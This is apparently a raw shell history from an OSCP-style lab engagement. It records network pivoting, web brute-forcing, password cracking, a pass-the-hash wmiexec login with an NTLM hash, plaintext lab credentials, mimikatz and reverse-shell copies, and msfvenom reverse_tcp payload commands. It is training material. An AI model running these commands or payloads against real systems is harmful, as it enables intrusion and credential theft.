 3147  2020-09-21 22:13  *kill -9 $(ps -x | grep firefox)
 3148  2020-09-21 22:44  joohns pass
 3149  2020-09-21 22:53  cat ../../../results/10.11.1.229/scans/tcp_80_http_gobuster.txt
 3150  2020-09-21 22:54  cat ../../../results/10.11.1.229/scans/_manual_commands.txt
 3151  2020-09-21 22:55  proxychains gobuster -u http://10.2.2.31:8443/dashboard/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -o "./gobuster/here"
 3152  2020-09-21 22:56  proxychains        gobuster dir -u http://10.2.2.31:8443/dashboard/  -w  /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "./gobusterhere"
 3153  2020-09-21 23:15  proxychains        gobuster dir -u http://10.2.2.31:8443/  -w  /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "./gobusterhere"
 3154  2020-09-21 23:15  proxychains        gobuster dir -u http://10.2.2.31:8443/  -w  /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "./gobusterhere"
 3155  2020-09-21 23:30  proxychains  gobuster dir -u http://10.2.2.31:8443/  -w  /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"
 3156  2020-09-22 00:04  proxychains    dirb http://10.2.2.31:8443/ /usr/share/seclists/Discovery/Web-Content/big.txt -l -r -S -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o ./drib
 3157  2020-09-22 00:40  proxychains    dirb http://10.2.2.31:8443/dashboard/ /usr/share/seclists/Discovery/Web-Content/big.txt -l -r  -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o ./drib
 3158  2020-09-22 00:45  serachsploit XAMPP
 3159  2020-09-22 00:45  searchsploit XAMPP
 3160  2020-09-22 01:10  proxychains    dirb http://10.2.2.31:7443/dashboard/ /usr/share/seclists/Discovery/Web-Content/big.txt -l -r  -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o ./drib7443
 3161  2020-09-22 03:47  ftp -h
 3162  2020-09-22 03:47  cat drib drib7443
 3163  2020-09-22 03:49  ping 10.11.1.252
 3164  2020-09-22 03:49  proxychains ssh  -f -v -N -D 9050 j0hn@10.11.1.252 -p 22000 
 3165  2020-09-22 04:29  touch cred.txt
 3166  2020-09-22 04:29  vim cred.txt
 3167  2020-09-22 05:34  proxychains nmap 10.2.2.31
 3168  2020-09-22 06:49  sudo reboot
 3169  2020-09-22 07:06  find ./ | grep pazdjoHxCGr2tjH16FVEvuwUTtHte8xK1EJ2nmWSHx4
 3170  2020-09-22 07:07  ssh  -f  -N -D 9050 j0hn@10.11.1.252 -p 22000 
 3171  2020-09-22 07:09  rm nmapTop1000.gnmap nmapTop1000.xml
 3172  2020-09-22 07:09  mv nmapTop1000.nmap OSCP/dev_dept/10.3.3.31
 3173  2020-09-22 07:09  cd OSCP/dev_dept/10.3.3.31 \n
 3174  2020-09-22 07:10  mv nmapTop1000.nmap scans
 3175  2020-09-22 07:10  proxychains nmap -sCV 10.2.2.31 -oA nmapTop1000
 3176  2020-09-22 07:12  cat nmapTop1000.nmap
 3177  2020-09-22 07:12  proxychains ping 10.3.3.31
 3178  2020-09-22 07:13  searchsploit  Directory Traversal
 3179  2020-09-22 07:18  searchsploit  Directory Traversal | awk ftp
 3180  2020-09-22 07:19  searchsploit  Directory Traversal | awk 
 3181  2020-09-22 07:19  searchsploit  Directory Traversal 
 3182  2020-09-22 07:19  locate / | grep windows/remote/22144.txt
 3183  2020-09-22 07:20  vim /usr/share/exploitdb/exploits/windows/remote/22144.txt
 3184  2020-09-22 07:23  searchsploit  ftp
 3185  2020-09-22 07:25  find / | grep windows/dos/24684.txt 2>/dev/null
 3186  2020-09-22 07:26  vi m/usr/share/exploitdb/exploits/windows/dos/24684.txt
 3187  2020-09-22 07:26  vim /usr/share/exploitdb/exploits/windows/dos/24684.txt
 3188  2020-09-22 07:27  cat 31
 3189  2020-09-22 07:30  proxychains ftp  10.2.2.31
 3190  2020-09-22 07:34  proxychains nmap  -sT 10.2.2.31
 3191  2020-09-22 07:38  netstat -ano | findstr  9050
 3192  2020-09-22 07:38  netstat -ano | find  9050
 3193  2020-09-22 07:39  findstr
 3194  2020-09-22 07:39  sudo apt install finstr
 3195  2020-09-22 07:39  sudo apt install finsdtr
 3196  2020-09-22 07:39  sudo apt install findstr
 3197  2020-09-22 07:40  sudo lsof -iTCP:89050 -sTCP:LISTEN\n
 3198  2020-09-22 07:40  kill 1316
 3199  2020-09-22 07:41  vim /usr/share/exploitdb/exploits/windows/dos/24684.txt\n
 3200  2020-09-22 07:42  #msfvenom  -p  windows/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=443  -f hta-psh -o meterpreter.hta
 3201  2020-09-22 07:44  vim evil.exe
 3202  2020-09-22 18:26  kill 3022
 3203  2020-09-22 18:37  vim password
 3204  2020-09-22 18:38  #rdesktop -u webadmin 10.11.1.229
 3205  2020-09-22 18:39  cat password
 3206  2020-09-22 18:39  proxychains rdesktop -u fm  10.2.2.31
 3207  2020-09-22 18:41  mkdir -p ../../xampp
 3208  2020-09-22 18:44  proxychains rdesktop -u xampp -p fm:$apr1$gUBRwnSI$XJMOlBNl00dvACkIf6xrH0  10.2.2.31
 3209  2020-09-22 18:48  cd 10.3.3.31/scans
 3210  2020-09-22 18:48  mkdir -p ../../users/Administrator/Desktop/
 3211  2020-09-22 18:48  cd Administrator/Desktop
 3212  2020-09-22 18:48  cat proof.txt
 3213  2020-09-22 18:54  cat ../../xampp/passwords.txt
 3214  2020-09-22 18:55  cat ../../xampp/passwords
 3215  2020-09-22 18:55  cat ../../xampp/password
 3216  2020-09-22 18:59  proxychains rdesktop -u xampp-dav-unsecure -p ppmax2011  10.2.2.31
 3217  2020-09-22 18:59  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt ../../xampp/password
 3218  2020-09-22 19:00  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt ../../xampp/password
 3219  2020-09-22 19:00  cd ../../xampp
 3220  2020-09-22 19:00  touch passwordcracked.txt
 3221  2020-09-22 19:00  echo smilealot >> passwordcracked.txt
 3222  2020-09-22 19:00  proxychains rdesktop -u xampp -p smilealot  10.2.2.31
 3223  2020-09-22 19:01  proxychains rdesktop -u xampp 10.2.2.31
 3224  2020-09-22 19:02  proxychains rdesktop -u Administrator -p smilealot 10.2.2.31
 3225  2020-09-22 19:03  proxychains rdesktop -u Apache -p smilealot 10.2.2.31
 3226  2020-09-22 19:17  find -h
 3227  2020-09-22 19:17  find -hhelp
 3228  2020-09-22 19:17  find --help
 3229  2020-09-22 19:22  mkdir -p ../../xampp/apache/conf/
 3230  2020-09-22 19:23  mv xampp ./dev_dept/xampp
 3231  2020-09-22 19:24  cat *
 3232  2020-09-22 19:24  vim httpd.conf
 3233  2020-09-22 19:33  cherrytree ../../results/10.11.1.229/report/mail.ctb
 3234  2020-09-22 19:46  cd apache
 3235  2020-09-22 19:46  cd conf
 3236  2020-09-22 19:51  cat drib7443
 3237  2020-09-22 19:52  cat drib7443l
 3238  2020-09-22 19:53  mkdir 10.2.2.86
 3239  2020-09-22 19:56  proxychains nmap -sT 10.2.2.86
 3240  2020-09-22 20:12  proxychains dirb http://10.2.2.31:8443/ /usr/share/seclists/Discovery/Web-Content/big.txt -l -r  -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o ./drib7443
 3241  2020-09-22 20:13  proxychains dirb http://10.2.2.31:8443/ /usr/share/seclists/Discovery/Web-Content/big.txt -l -r  -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o ./drib8443
 3242  2020-09-22 20:27  proxychains nmap  10.2.2.86 --top-ports 
 3243  2020-09-22 20:28  #proxychains dirb http://10.2.2.31:8443/ /usr/share/seclists/Discovery/Web-Content/big.txt -l -r  -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o ./drib7443
 3244  2020-09-22 20:28  cat gobusterhere
 3245  2020-09-22 20:28  cat drib
 3246  2020-09-22 20:29  dribbuster
 3247  2020-09-22 20:29  drbbuster
 3248  2020-09-22 20:29  cat ../../../results/10.11.1.118/scans/_manual_commands.txt
 3249  2020-09-22 20:29  cat ../../../results/10.11.1.31/scans/_manual_commands.txt
 3250  2020-09-22 20:33  proxychains  dirsearch -u http://10.2.2.31:8443/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt --plain-text-report=./
 3251  2020-09-22 20:34  sudo apt install dotdotpwn 
 3252  2020-09-22 20:34  sudo apt install dirsearch
 3253  2020-09-22 20:41  cd 10.1.1.235
 3254  2020-09-22 20:41  cherrytree nina.ctb
 3255  2020-09-22 20:44  serachsploit xampp
 3256  2020-09-22 21:26  find / 2>/dev/null  | grep xampp
 3257  2020-09-22 21:30  find / 2>/dev/null  | grep php/webapps/32721.txt
 3258  2020-09-22 21:36  vim /usr/share/exploitdb/exploits/php/webapps/32721.txt
 3259  2020-09-22 21:41  XAMPP - 'Phonebook.php' Multiple Remote HTML Injection Vulnerabilities                                                                                                                                                                                          | multiple/remote/25391.txt
 3260  2020-09-22 21:41  XAMPP - Insecure Default Password Disclosure                                                                                                                                                                                                                    | multiple/dos/25393.txt
 3261  2020-09-22 21:41  XAMPP - WebDAV PHP Upload (Metasploit)                                                                                                                                                                                                                          | windows/remote/18367.rb
 3262  2020-09-22 21:41  XAMPP 1.6.8 - Cross-Site Request Forgery (Change Administrative Password)                                                                                                                                                                                       | windows/remote/7384.txt
 3263  2020-09-22 21:41  XAMPP 1.6.x - 'showcode.php' Local File Inclusion                                                                                                                                                                                                               | multiple/webapps/33578.txt
 3264  2020-09-22 21:41  XAMPP 1.6.x - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                                                                                     | multiple/remote/33577.txt
 3265  2020-09-22 21:41  XAMPP 1.7.2 - Change Administrative Password                                                                                                                                                                                                                    | php/webapps/10391.txt
 3266  2020-09-22 21:41  XAMPP 1.7.3 - Multiple Vulnerabilities                                                                                                                                                                                                                          | php/webapps/15370.txt
 3267  2020-09-22 21:41  XAMPP 1.7.4 - Cross-Site Scripting                                                                                                                                                                                                                              | windows/remote/36258.txt
 3268  2020-09-22 21:41  XAMPP 1.7.7 - 'PHP_SELF' Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                                                                          | windows/remote/36291.txt
 3269  2020-09-22 21:41  XAMPP 1.8.1 - 'lang.php?WriteIntoLocalDisk method' Local Write Access                                                                                                                                                                                           | php/webapps/28654.txt
 3270  2020-09-22 21:41  XAMPP 3.2.1 & phpMyAdmin 4.1.6 - Multiple Vulnerabilities                                                                                                                                                                                                       | php/webapps/32721.txt
 3271  2020-09-22 21:41  XAMPP 5.6.8 - SQL Injection / Persistent Cross-Site Scripting                                                                                                                                                                                                   | php/webapps/46424.html
 3272  2020-09-22 21:41  XAMPP Control Panel - Denial Of Service                                                                                                                                                                                                                         | windows/dos/40964.py
 3273  2020-09-22 21:41  XAMPP Control Panel 3.2.2 - Buffer Overflow (SEH) (Unicode)                                                                                                                                                                                                     | windows/local/45828.py
 3274  2020-09-22 21:41  XAMPP Control Panel 3.2.2 - Denial of Service (PoC)                                                                                                                                                                                                             | windows_x86/dos/45419.py
 3275  2020-09-22 21:41  XAMPP for Windows 1.6.0a - 'mssql_connect()' Remote Buffer Overflow                                                                                                                                                                                             | windows/remote/3738.php
 3276  2020-09-22 21:41  XAMPP for Windows 1.6.3a - Local Privilege Escalation                                                                                                                                                                                                           | windows/local/4325.php
 3277  2020-09-22 21:41  XAMPP for Windows 1.6.8 - 'cds.php' SQL Injection                                                                                                                                                                                                               | windows/remote/32457.txt
 3278  2020-09-22 21:41  XAMPP for Windows 1.6.8 - 'Phonebook.php' SQL Injection                                                                                                                                                                                                         | windows/remote/32460.txt
 3279  2020-09-22 21:41  XAMPP for Windows 1.7.7 - Multiple Cross-Site Scripting / SQL Injections                                                                                                                                                                                        | windows/remote/37396.txt
 3280  2020-09-22 21:42  windows/remote/37396.txt
 3281  2020-09-22 21:42  find / 2>/dev/null  | grep windows/remote/37396.txt
 3282  2020-09-22 21:45  vim /usr/share/exploitdb/exploits/windows/remote/37396.txt
 3283  2020-09-22 21:46  searchsploit xampp
 3284  2020-09-22 21:51  cat _commands.log
 3285  2020-09-22 21:51  prproxychains nikto -ask=no -h http://10.2.2.31:8443
 3286  2020-09-22 21:51  prroxychains nikto -ask=no -h http://10.2.2.31:8443
 3287  2020-09-22 21:51  proxychains nikto -ask=no -h http://10.2.2.31:8443
 3288  2020-09-22 21:52  proxychains nikto -ask=no -h http://10.2.2.86:80
 3289  2020-09-22 22:04  proxychains nikto -ask=no -h http://10.2.2.31:8443\n
 3290  2020-09-22 22:55  cat passwordcracked.txt
 3291  2020-09-23 06:55  firefox
 3292  2020-09-23 18:37  cd xampp
 3293  2020-09-23 18:40  nmap -sC -sV 10.2.2.86
 3294  2020-09-23 18:40  proxychaisnnmap -sC -sV 10.2.2.86
 3295  2020-09-23 18:40  proxychains nmap -sC -sV 10.2.2.86
 3296  2020-09-23 18:44  searchsploit PHP Power Brows
 3297  2020-09-23 18:44  find / 2>/dev/null  | grep php/webapps/40204.txt
 3298  2020-09-23 19:10  vim /usr/share/exploitdb/exploits/php/webapps/40204.txt
 3299  2020-09-23 19:33  proxychains ftp  -p 10.2.2.31
 3300  2020-09-23 19:59  proxychains nmap 10.2.2.86
 3301  2020-09-23 20:06  proxychains  nmap -sT -v 10.2.2.86
 3302  2020-09-23 20:16  touch winlfi.txt
 3303  2020-09-23 20:17  touch winlfi2.txt
 3304  2020-09-23 20:19  vim winlfi2.txt
 3305  2020-09-23 20:19  vim winlfi
 3306  2020-09-23 20:19  cat winlfi >> winlfi.txt
 3307  2020-09-23 20:20  vim winlfi.txt
 3308  2020-09-23 20:20  rm winlfi
 3309  2020-09-23 20:20  wfuzz
 3310  2020-09-23 20:22  proxychains wfuzz -c -z file,winlfi2.txt -z file,winlfi.txt https://10.2.2.86/browse.php\?p\=source\&file\=
 3311  2020-09-23 20:27  proxychains wfuzz -c -z file,winlfi2.txt -z file,winlfi.txt -u https://10.2.2.86/browse.php\?p\=source\&file\=
 3312  2020-09-23 20:27  proxychains wfuzz -c -d -z file,winlfi2.txt -z file,winlfi.txt -u https://10.2.2.86/browse.php\?p\=source\&file\=a
 3313  2020-09-23 20:32  wfuzz -h
 3314  2020-09-23 20:34  proxychains wfuzz -c -w ./winlfi -u https://10.2.2.86/browse.php\?p\=source\&file\=a
 3315  2020-09-23 20:34  proxychains wfuzz -c -w ./winlfi.txt -u https://10.2.2.86/browse.php\?p\=source\&file\=a
 3316  2020-09-23 20:35  proxychains wfuzz -c -w ./winlfi.txt -u https://10.2.2.86/browse.php\?p\=source\&file\=FUZZ
 3317  2020-09-23 20:36  proxychains wfuzz -c -w ./winlfi2.txt -u https://10.2.2.86/browse.php\?p\=source\&file\=FUZZ
 3318  2020-09-23 21:54  proxychains ftp  10.2.2.86
 3319  2020-09-23 21:55  proxychains ftp  -p 10.2.2.86
 3320  2020-09-23 23:04  cd Downloads/privilege-escalation-awesome-scripts-suite
 3321  2020-09-23 23:04  cd Downloads/privilege-escalation-awesome-scripts-suite/
 3322  2020-09-23 23:08  locate / | grep winpeas
 3323  2020-09-23 23:14  locate / | grep winp
 3324  2020-09-24 03:47  git https://github.com/ohpe/juicy-potato.git
 3325  2020-09-24 03:47  c ..
 3326  2020-09-24 03:47  git clone https://github.com/ohpe/juicy-potato.git
 3327  2020-09-24 18:51  kill 1417
 3328  2020-09-24 18:59  cd Downloads/
 3329  2020-09-24 18:59  cd j
 3330  2020-09-24 19:01  sudo proxychains python -m SimpleHTTPServer 80
 3331  2020-09-24 19:02  cd de
 3332  2020-09-24 19:11  cd cd dev
 3333  2020-09-24 19:16  msfconsole -q
 3334  2020-09-24 19:59  localte / | grep winpea
 3335  2020-09-24 20:00  cp /home/kali/Downloads/privilege-escalation-awesome-scripts-suite/winPEAS
 3336  2020-09-24 20:09  "C:\Program Files\Iperius\Iperius Remote\IperiusRemote.exe"
 3337  2020-09-25 00:42  git commit -m "fininshed johngot dev subnet"
 3338  2020-09-25 00:49  autorecon 10.11.1.221
 3339  2020-09-25 01:15  kls
 3340  2020-09-25 01:16  cat tcp_5985_http_index.html
 3341  2020-09-25 01:17  nmap -sC -sV 10.11.1.221
 3342  2020-09-25 01:21  nmap -Pn -sC -sV 10.11.1.221
 3343  2020-09-25 01:31  rcpdump
 3344  2020-09-25 01:31  sudo apt install rcpdump
 3345  2020-09-25 01:32  nmap -n -v -sV -Pn -p 135 --script=msrpc-enum 10.11.1.221
 3346  2020-09-25 01:33  rdesktop -u john -p easyas123 10.11.1.221
 3347  2020-09-25 01:38  sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum 10.11.1.221
 3348  2020-09-25 01:40  cat tcp_49666_rpc_nmap.txt
 3349  2020-09-25 01:47  tcp_49666_rpc_nmap.txt
 3350  2020-09-25 01:53  gem install evil-winrm
 3351  2020-09-25 01:53  sudo gem install evil-winrm
 3352  2020-09-25 02:23  cp /home/kali/Downloads/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASbat/winPEAS.bat ./
 3353  2020-09-25 03:22  cp /home/kali/OSCP/13/results/10.11.1.13/exploit/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/obj/x86/Release/winPEAS.exe ./
 3354  2020-09-25 04:52  sudo nmap -n -Pn -sU -p64466 -sV --script tftp-enum 10.11.1.221
 3355  2020-09-26 07:32  cp  ~/OSCP/it_dept/results/10.1.1.235/exploit/mimikatz_x86.exe ./
 3356  2020-09-26 08:00  cp ~/Downloads/Watson-2.0.zip ./
 3357  2020-09-26 08:00  unzip Watson-2.0.zip
 3358  2020-09-26 08:00  cd Watson-2.0
 3359  2020-09-26 08:00  cd Watson
 3360  2020-09-26 08:00  cd Msrc
 3361  2020-09-26 08:00  cd Properties
 3362  2020-09-26 08:36  rm -rf Watson-2.0
 3363  2020-09-26 08:36  #    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.202 LPORT=443 -f exe > IperiusRemote.exe\n
 3364  2020-09-26 09:37  sudo apt-get install wine32
 3365  2020-09-26 09:50  locate / | grep psexec.exe
 3366  2020-09-26 09:51  mkdir PStoolsffs
 3367  2020-09-26 09:51  mv PSTools.zip PStoolsffs
 3368  2020-09-26 09:51  cd PStoolsffs
 3369  2020-09-26 09:51  unzip PSTools.zip
 3370  2020-09-26 09:52  cp ~/Downloads/PStoolsffs/PsExec.exe ./
 3371  2020-09-26 22:13  locate / | grep acc
 3372  2020-09-26 22:13  locate / | grep access
 3373  2020-09-26 22:13  locate / | grep accesschk
 3374  2020-09-27 00:07  git clone https://github.com/M4ximuss/Powerless.git
 3375  2020-09-27 00:07  cd Powerless
 3376  2020-09-27 00:07  cp Powerless.bat ~/OSCP/results/10.11.1.221/exploit/
 3377  2020-09-27 00:07  cd ~/OSCP/results/10.11.1.221/exploit
 3378  2020-09-27 00:09  touch jaws.ps1
 3379  2020-09-27 00:09  vim jaws.ps1
 3380  2020-09-27 00:25  echo Zmc1NGZnR0ZINGdmZ0c >> hash.txt
 3381  2020-09-27 00:26  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt hash.txt
 3382  2020-09-27 00:26  hashid Zmc1NGZnR0ZINGdmZ0c
 3383  2020-09-27 00:48  tcp_5985_http_nmap.txt
 3384  2020-09-27 00:48  cat tcp_5985_http_nmap.txt
 3385  2020-09-27 00:49  git commit -m "finished defender"
 3386  2020-09-27 01:04  evil-winrm -i 10.11.1.221 -u john -p 'easyas123' 
 3387  2020-09-27 01:09  c dres
 3388  2020-09-27 01:26  NTML.txt
 3389  2020-09-27 01:26  touch NTML.txt
 3390  2020-09-27 07:30  vim hash.txt
 3391  2020-09-27 09:22  # python /usr/local/bin/wmiexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:XXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXX Administrator@10.11.1.220
 3392  2020-09-27 09:22  # python /usr/local/bin/wmiexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:09d9c245034a155bc5a72d99f053faeb Administrator@10.11.1.220
 3393  2020-09-27 09:27  locate / | grep wmiexec
 3394  2020-09-27 09:30  /home/kali/.local/bin/wmiexec.py
 3395  2020-09-27 09:31  #/home/kali/.local/bin/wmiexec.py
 3396  2020-09-27 09:31  /home/kali/.local/bin/wmiexec.py  -hashes AAD3B435B51404EEAAD3B435B51404EE:09d9c245034a155bc5a72d99f053faeb Administrator@10.11.1.220
 3397  2020-09-27 09:31  python /home/kali/.local/bin/wmiexec.py  -hashes AAD3B435B51404EEAAD3B435B51404EE:09d9c245034a155bc5a72d99f053faeb Administrator@10.11.1.220
 3398  2020-09-27 09:34  cat tcp_88_kerberos_nmap.txt
 3399  2020-09-27 09:34  cat tcp_47001_http_whatweb.txt
 3400  2020-09-27 09:36  evil-winrm -i 10.11.1.220 -u john -p 'easyas123' 
 3401  2020-09-27 09:37  evil-winrm -i 10.11.1.220 -u administrator  -p 'fg54fgGFH4gfgG' 
 3402  2020-09-27 09:38  cat NTML.txt
 3403  2020-09-27 09:38  vim  NTML.txt
 3404  2020-09-27 09:53  /usr/sbin/john --format= --rules -w=/usr/share/wordlists/rockyou.txt NTML.txt
 3405  2020-09-27 09:54  /usr/sbin/john  --rules -w=/usr/share/wordlists/rockyou.txt NTML.txt
 3406  2020-09-27 10:01  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt NTML.txt
 3407  2020-09-27 10:29  \/
 3408  2020-09-27 10:29  cd ~/OSCP/results/10.11.1.220/scans
 3409  2020-09-27 10:57  git commit -m "finished master"
 3410  2020-09-27 18:38  cp /home/kali/OSCP/results/10.11.1.222/exploit/mimikatz64.exe ./
 3411  2020-09-27 18:45  autorecon 10.11.1.248
 3412  2020-09-27 18:47  cp ../../10.11.1.221/exploit/mimikatz_x86.exe ./
 3413  2020-09-27 18:57  cp /usr/share/windows-resources/mimikatz ./
 3414  2020-09-27 18:58  cp /home/kali/Downloads/x64/mimikatz.exe ./
 3415  2020-09-27 18:59  autorecon 10.11.1.247
 3416  2020-09-27 19:02  rdesktop -u cory -p ilovesecurity 10.11.1.217
 3417  2020-09-27 19:04  ilovesecurity
 3418  2020-09-27 19:11  cp /home/kali/OSCP/13/results/10.11.1.13/exploit/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/obj/x64/Release ./
 3419  2020-09-27 19:17  vim notes.txt
 3420  2020-09-27 19:22  searchsploit windows 8
 3421  2020-09-27 19:23  searchsploit windows 8.1 pro
 3422  2020-09-27 19:24  locate windows/local/35811.txt
 3423  2020-09-27 19:24  vim /usr/share/exploitdb/exploits/windows/local/35811.txt
 3424  2020-09-27 19:31  locate windows/local/15031.py
 3425  2020-09-27 19:31  vim /usr/share/exploitdb/exploits/windows/local/15031.py
 3426  2020-09-27 20:00  git commit -m "finished cory"
 3427  2020-09-27 20:03  rdesktop -u cory -p ilovesecurity 10.11.1.247
 3428  2020-09-27 20:05  cd 10.11.1.247
 3429  2020-09-27 20:05  cherrytree cory.ctb
 3430  2020-09-27 20:13  ssh  -f  -v -N -D 9050 j0hn@10.11.1.252 -p 22000 
 3431  2020-09-27 20:14  ssh  \j0hn@10.11.1.252 -p 22000 
 3432  2020-09-27 20:14  ssh  j0hn@10.11.1.252 -p 22000 
 3433  2020-09-27 20:21  mkdir 10.2.2.150
 3434  2020-09-27 20:21  cd 10.
 3435  2020-09-27 20:23  searchsploit Samba smbd
 3436  2020-09-27 20:23  mkdir exploits
 3437  2020-09-27 20:29  searchsploit Samba 4.2.10
 3438  2020-09-27 20:29  searchsploit Samba 4
 3439  2020-09-27 20:30  smbclient  //10.11.1.231/home -U ""
 3440  2020-09-27 20:30  proxychains smbclient -L \\10.2.2.150
 3441  2020-09-27 20:31  nproxychains smbclient  //10.2.2.150/adam -U ""
 3442  2020-09-27 20:31  proxychains smbclient  //10.2.2.150/adam -U ""
 3443  2020-09-27 20:31  proxychains smbclient  //10.2.2.150/master -U ""
 3444  2020-09-27 20:31  proxychains smbclient  //10.2.2.150/ -U ""
 3445  2020-09-27 20:32  cd 10.11.1.217
 3446  2020-09-27 20:32  cd 10.11.1.14
 3447  2020-09-27 20:34  cd 1
 3448  2020-09-27 20:34  cd 13/results/10.11.1.13/scans
 3449  2020-09-27 20:36  cd 10.11.1.136
 3450  2020-09-27 20:36  less _commands.log
 3451  2020-09-27 20:37  proxychains smbclient -H  //10.2.2.150/ -U ""
 3452  2020-09-27 20:37  proxychains smbclient -H  //10.2.2.150/ 
 3453  2020-09-27 20:37  proxychains smbclient -H=L  //10.2.2.150
 3454  2020-09-27 20:38  proxychains smbclient -L  //10.2.2.150
 3455  2020-09-27 20:39  proxychains smbclient -H  //10.2.2.150
 3456  2020-09-27 20:39  proxychains smbclient -H  10.2.2.150
 3457  2020-09-27 20:40  proxychains smbmap -H  10.2.2.150
 3458  2020-09-27 20:42  smbclient -L\\ -N -I 10.2.2.150
 3459  2020-09-27 20:42  proxychains smbclient -L\\ -N -I 10.2.2.150
 3460  2020-09-27 20:43  proxychains smbmap -H 10.11.1.136 -P 139 
 3461  2020-09-27 20:44  proxychains smbmap -H 10.2.2.150 -P 139 
 3462  2020-09-27 20:44  proxychains smbmap -H 10.2.2.150 -P 445
 3463  2020-09-27 20:54  md
 3464  2020-09-27 20:54  cmd
 3465  2020-09-27 20:54  sshuttle -r  j0hn@10.11.1.252:22000  10.2.2.1/24  --python=/usr/bin/python3
 3466  2020-09-27 20:55  burp
 3467  2020-09-27 20:55  burpsuite
 3468  2020-09-27 20:55  proxychains sudo burpsuite
 3469  2020-09-27 20:59  sshuttle -r  j0hn@10.11.1.252:22000  10.2.2.1/24
 3470  2020-09-27 21:43  sudo apt update  sshuttle \n
 3471  2020-09-27 21:44  sudo apt update  \n
 3472  2020-09-27 21:44  sudo apt upgrade\n
 3473  2020-09-27 21:57  sshuttle -V
 3474  2020-09-27 22:35  tar sshuttle_0.78.3.orig.tar.gz
 3475  2020-09-27 22:36  tar -xzf  sshuttle_0.78.3.orig.tar.gz
 3476  2020-09-27 22:37  cd sshuttle
 3477  2020-09-27 22:37  vim setup.py 
 3478  2020-09-27 22:38  run
 3479  2020-09-27 22:38  ./run
 3480  2020-09-28 05:45  curl https://10.2.2.150/ping.php
 3481  2020-09-28 06:56  curl https://10.2.2.150/index.html
 3482  2020-09-28 06:57  wget https://10.2.2.150/index.html
 3483  2020-09-28 07:11  gobuster dir -u http://10.2.2.150/  -w  /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"
 3484  2020-09-28 07:17  gobuster dir -u https://10.2.2.150/  -w  /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"
 3485  2020-09-28 07:33  curl https://10.2.2.150/
 3486  2020-09-28 07:34  wget https://10.2.2.150/
 3487  2020-09-28 07:34  wget --no-check-certificate https://10.2.2.150/
 3488  2020-09-28 07:34  curl --no-check-certificate https://10.2.2.150/
 3489  2020-09-28 07:35  wget --no-check-certificate https://10.2.2.150/ping.php
 3490  2020-09-28 07:35  cat p
 3491  2020-09-28 07:35  less ping.php
 3492  2020-09-28 07:35  rm ping.php
 3493  2020-09-28 09:20  cherrytree pain.ctb
 3494  2020-09-28 09:39  http
 3495  2020-09-28 19:19  sudo lsof -iTCP:9050 -sTCP:LISTEN\n
 3496  2020-09-28 19:28  curl https://10.2.2.150/index.php\?page\=ping.php
 3497  2020-09-28 21:46  cd linPEAS
 3498  2020-09-28 22:30  autorecon 10.2.2.23
 3499  2020-09-28 22:30  cd Dev
 3500  2020-09-28 22:31  mkdir 10.2.2.22
 3501  2020-09-28 22:33  touch p0nmap
 3502  2020-09-28 22:33  vim p0nmap
 3503  2020-09-28 22:51  autorecon 10.2.2.22
 3504  2020-09-28 22:56  rdesktop -u james -p FmyN3rZ37LNss2X 10.2.2.23
 3505  2020-09-28 23:05  smbclient -L  //10.2.2.150/ -U "james"
 3506  2020-09-28 23:10  vim _manual_commands.txt
 3507  2020-09-28 23:10  vim _commands.log
 3508  2020-09-28 23:14  ccd ..
 3509  2020-09-28 23:18  cd pro
 3510  2020-09-28 23:18  locate / | grep  winpeas.exe
 3511  2020-09-28 23:19  cd ob
 3512  2020-09-28 23:21  cd ~/OSCP/dev_dept/results/10.2.2.23/exploit
 3513  2020-09-28 23:21  cp ../../10.11.1.221/exploit/jaws.ps1 ./
 3514  2020-09-28 23:22  cp ~/OSCP/results/10.11.1.221/exploit/jaws.ps1 ./
 3515  2020-09-29 03:46  locate / | grep  /usr/share/webshells/
 3516  2020-09-29 03:47  vim /usr/share/webshells/perl
 3517  2020-09-29 03:47  cp /usr/share/webshells/perl/perl-reverse-shell.pl ./
 3518  2020-09-29 04:37  vim perl-reverse-shell.pl
 3519  2020-09-29 05:45  git commit -m "finished adam"
 3520  2020-09-29 05:46  cd 10.2.2.23
 3521  2020-09-29 05:48  cat tcp_3389_rdp_nmap.txt
 3522  2020-09-29 05:52  smbclient -L  //10.2.2.22/ -U "carol"
 3523  2020-09-29 05:53  smbclient -L //10.1.1.27
 3524  2020-09-29 07:01  cat tcp_49665_rpc_nmap.txt
